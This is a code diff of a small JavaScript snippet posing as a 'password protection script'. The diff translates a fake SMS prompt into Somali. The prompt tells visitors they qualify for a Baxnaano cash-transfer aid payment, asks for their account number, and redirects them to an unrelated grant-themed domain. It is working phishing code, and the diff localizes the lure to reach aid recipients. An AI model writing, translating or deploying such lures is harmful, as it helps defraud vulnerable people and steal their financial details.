@@ -1,9 +1,9 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'WITHDRAW CASH'
+var password = 'HALKAN KA QAADO LACAG'
 password = prompt(
-  'SMS: Congratulations! You are eligible to receive BAXNAANO CASH TRANSFER. Please press OK to Enter your Account Number.',
-  'WITHDRAW CASH'
+  'SMS: Hambalyo! Waxaa laguu xaqiijiyey inaad u qalanto helitaanka lacagta kaalmada Barnaamijka Baxnaano. Fadlan riix OK si aad u geliso lambarka akoonkaaga.',
+  'HALKAN KA QAADO LACAG'
 ); 
-if (password != 'WITHDRAW CASH') {
+if (password != 'HALKAN KA QAADO LACAG') {
   location.href = 'https://ongoing-grant.cfd/Baxnaano-Ka-Faaiidaystayaasha.html';
   }
